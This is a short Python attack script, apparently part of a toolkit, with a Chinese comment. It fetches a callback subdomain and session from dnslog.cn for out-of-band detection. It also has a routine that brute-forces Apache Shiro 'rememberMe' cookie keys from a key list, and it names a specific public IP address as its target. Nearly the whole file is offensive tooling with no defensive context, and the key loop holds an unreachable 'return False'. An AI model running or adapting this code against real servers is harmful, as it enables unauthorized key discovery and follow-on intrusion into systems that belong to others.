##用来测试一些脚本方法的
#
import time
import requests
import urllib3

urllib3.disable_warnings()

def Scripts(url):
    test = Testfuntions()
    targets = url
    TestMessage = test.getDnslogCookie()
    dnslog = TestMessage[0]
    phpssid = TestMessage[1]
    print(dnslog+' '+phpssid)
    # keys = test.findKeys(url)
    # print('[ + ]I found the keys:',keys)

class Testfuntions(object):
    def getDnslogCookie(self):
        import requests
        dnslog    = "http://dnslog.cn/getdomain.php"
        res       = requests.get(dnslog,timeout=10)
        dnslogUrl = res.text
        cookie    = res.cookies
        phpsessid = cookie['PHPSESSID']
        return  dnslogUrl, phpsessid

    def findKeys(self,url):
        with open('key.log','r') as k:
            ke = k.readlines()
            for i in ke:
                x   = i.strip('\n')
                y   = x.split(':')
                key = y[0]
                keyCookie = y[1]
                header={
                    'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;',
                    'Cookie' : 'rememberMe={}'.format(keyCookie)
                    }
                res = requests.post(url,headers=header,verify=False,timeout=30)
                if 'rememberMe' not in str(res.headers):
                    print(res.headers)
                    return key
                else:
                    continue
                return False





if __name__ == '__main__':
    url = 'http://123.57.47.82/'
    Scripts(url)